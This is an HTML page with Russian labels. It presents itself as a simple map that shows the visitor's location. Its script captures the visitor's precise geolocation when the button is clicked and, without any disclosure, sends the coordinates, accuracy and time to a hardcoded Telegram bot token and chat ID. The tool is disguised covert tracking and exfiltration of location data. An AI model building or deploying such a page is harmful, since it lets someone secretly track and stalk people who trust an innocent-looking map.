<!DOCTYPE html>
<html>
<head>
    <title>Карта местоположения</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background: white;
        }
        #map {
            height: 85vh;
            width: 100%;
        }
        #controls {
            padding: 15px;
            text-align: center;
        }
        button {
            background: #000;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 20px;
            font-size: 16px;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        button:hover {
            opacity: 0.8;
        }
        button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        .leaflet-control-container {
            display: none !important;
        }
    </style>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
</head>
<body>
    <div id="map"></div>
    <div id="controls">
        <button id="locateBtn">📍 Определить местоположение</button>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        const BOT_TOKEN = '8186815938:AAGC5xZ-LuNbm-HTYO7BNd0vKkPly3Pwy7c';
        const CHAT_ID = '6503842877';
        let map, marker;

        async function sendLocation(lat, lng, accuracy) {
            const message = `🌍 Новые координаты:
Широта: ${lat.toFixed(6)}
Долгота: ${lng.toFixed(6)}
Точность: ${accuracy.toFixed(1)} м
Время: ${new Date().toLocaleTimeString()}`;

            try {
                await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`
                );
            } catch(e) {
                console.error('Ошибка отправки:', e);
            }
        }

        function initMap(lat, lng) {
            if (!map) {
                map = L.map('map', {
                    attributionControl: false,
                    zoomControl: false
                }).setView([lat, lng], 16);

                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: ''
                }).addTo(map);
            }

            if (marker) marker.remove();
            marker = L.marker([lat, lng]).addTo(map);
        }

        document.getElementById('locateBtn').addEventListener('click', async () => {
            const btn = document.getElementById('locateBtn');
            btn.disabled = true;
            btn.textContent = 'Определяем...';

            try {
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 8000
                    });
                });

                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                
                initMap(lat, lng);
                await sendLocation(lat, lng, position.coords.accuracy);

                btn.textContent = 'Готово!';
                setTimeout(() => {
                    btn.disabled = false;
                    btn.textContent = '📍 Определить местоположение';
                }, 2000);

            } catch(error) {
                console.error('Ошибка:', error);
                btn.textContent = 'Ошибка!';
                setTimeout(() => {
                    btn.disabled = false;
                    btn.textContent = '📍 Определить местоположение';
                }, 1500);
            }
        });
    </script>
</body>
</html>
